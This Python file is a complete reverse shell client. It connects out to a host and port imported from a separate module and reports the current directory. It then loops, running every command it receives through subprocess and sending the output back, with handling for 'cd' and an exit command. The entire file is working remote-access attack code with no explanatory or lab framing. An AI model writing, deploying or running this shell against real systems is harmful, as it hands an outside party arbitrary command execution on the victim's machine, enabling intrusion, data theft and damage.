import socket
import sys
import os
import subprocess
import sys
from addresses import host, port

host = host
port = port

BUFFER_SIZE = 1024*128 # max size of messages = 128KB
SEPARATOR = "<sep>"

try:
    client_socket = socket.socket() #(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.connect((host,port))
except socket.error as err:
    print(err)
    sys.exit()

cwd = os.getcwd()
client_socket.send(cwd.encode())

while True:
    command = client_socket.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()

    if command.lower() in ['exit','q']: break
    if splitted_command[0].lower() == 'cd':
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else: output = ""
    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    client_socket.send(message.encode())

client_socket.close()
